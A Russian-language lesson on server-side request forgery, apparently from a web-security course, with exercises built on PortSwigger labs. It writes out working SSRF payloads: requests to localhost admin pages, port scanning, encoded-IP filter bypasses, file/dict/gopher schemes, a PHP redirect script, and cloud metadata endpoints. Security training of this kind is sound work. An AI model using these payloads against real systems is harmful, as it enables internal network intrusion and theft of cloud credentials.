# Занятие 26. SSRF: Server-Side Request Forgery, лабы PortSwigger

## Теория

**SSRF (Server-Side Request Forgery)** — уязвимость, при которой атакующий заставляет сервер выполнить HTTP-запрос по указанному адресу. Сервер становится прокси для атакующего.

### Механизм работы

1. Веб-приложение принимает URL от пользователя (например, для загрузки аватара, проверки ссылки)
2. Сервер выполняет запрос к этому URL
3. Атакующий подставляет адрес внутреннего сервиса (например, `http://localhost:8080/admin`)
4. Сервер выполняет запрос и возвращает ответ атакующему

### Что можно сделать через SSRF

- Сканировать внутреннюю сеть (port scanning)
- Доступ к внутренним сервисам (Redis, Elasticsearch, Admin панели)
- Обход аутентификации (запрос от имени сервера)
- Чтение файлов (`file:///etc/passwd` через URL-схемы)
- Атака на облачные метаданные (AWS, GCP)

### Категории SSRF

1. **Basic SSRF**: Ответ от внутреннего сервиса возвращается пользователю
2. **Blind SSRF**: Ответ не виден, но запрос выполняется (используется для сканирования или атак через DNS/HTTP callbacks)

### Обход фильтров

| Фильтр | Обход |
|--------|-------|
| Блокирует `127.0.0.1` | Используйте `localhost`, `0.0.0.0`, `0177.0.0.1` (восьмеричная) |
| Блокирует `localhost` | `spoofed.burpcollaborator.net` или `2130706433` (десятичная) |
| Проверяет HTTP/HTTPS | Используйте `file://`, `dict://`, `gopher://` |
| Блокирует URL | Используйте URL encoding: `%6c%6f%63%61%6c%68%6f%73%74` |

---

## Практическое занятие

### Лаборатории PortSwigger

PortSwigger (создатели Burp Suite) предоставляют бесплатные лабы по SSRF.

1. Зарегистрируйтесь на https://portswigger.net/web-security/ssrf
2. Перейдите в **Server-side request forgery (SSRF)**
3. Выполните лабу **SSRF with filter bypass via open redirection**

### Практика: Базовый SSRF

**Шаг 1: Поиск функционала, принимающего URL**
Ищите функции:
- Загрузка аватара по URL
- Проверка ссылок (URL preview)
- Webhooks
- API, принимающее callback URL

**Шаг 2: Атака на localhost**
```
POST /check-url HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded

url=http://localhost/admin
```

Если сервер вернул содержимое `/admin` — SSRF сработал.

**Шаг 3: Сканирование портов**
Используйте Burp Intruder для перебора портов:
```
url=http://localhost:§PORT§
```
Payloads: 22, 80, 443, 6379 (Redis), 9200 (Elasticsearch), 8080

Смотрите на время ответа и содержимое.

**Шаг 4: Использование Burp Collaborator**
1. В Burp откройте **Burp → Collaborator**
2. Нажмите **Copy to clipboard** (получите уникальный domain)
3. Отправьте SSRF запрос: `url=http://ВАШ_DOMAIN.collaborator.net`
4. Нажмите **Poll now** в Collaborator — должен прийти DNS + HTTP запрос

### Практика: Обход фильтров

Если заблокирован `localhost`:
```
url=http://0x7f000001/admin  # hex для 127.0.0.1
url=http://2130706433/admin   # decimal для 127.0.0.1
url=http://127.1/admin        # сокращенный формат
```

### Скриншоты для отчета

1. **Скриншот 1**: PortSwigger лаба решена (зеленая галочка)
2. **Скриншот 2**: Burp Collaborator — получен HTTP/DNS запрос
3. **Скриншот 3**: Сканирование портов — ответы от разных портов

---

## Задачи для самостоятельного выполнения

1. **Лабы PortSwigger**: Решите минимум 2 лабы по SSRF на https://portswigger.net/web-security/ssrf. Сделайте скриншот каждой решенной лабы (с зеленой галочкой).

2. **SSRF через URL-схемы**: Попробуйте использовать схемы, отличные от http://:
   - `file:///etc/passwd`
   - `dict://localhost:11211/` (memcached)
   - `gopher://localhost:25/` (SMTP)
   
   Опишите, какие схемы заблокированы, какие работают.

3. **Обход через redirect**: Научитесь обходить фильтры через redirect. Создайте простой скрипт `redirect.php`:
   ```php
   <?php header("Location: http://localhost/admin"); ?>
   ```
   Используйте: `url=http://yourserver.com/redirect.php`. Сработал ли обход?

4. **Blind SSRF с Collaborator**: В Burp Suite откройте Collaborator, получите уникальный domain. Используйте его в SSRF-пейлоаде. Покажите в отчете: пришел ли DNS-запрос в Collaborator, пришел ли HTTP-запрос.

5. **Cloud SSRF**: Изучите уязвимость SSRF к метаданным облаков. Попробуйте (на лабах) запросить:
   - AWS: `http://169.254.169.254/latest/meta-data/`
   - GCP: `http://metadata.google.internal/computeMetadata/v1/`
   
   Опишите, какая информация может утечь через эти эндпоинты.
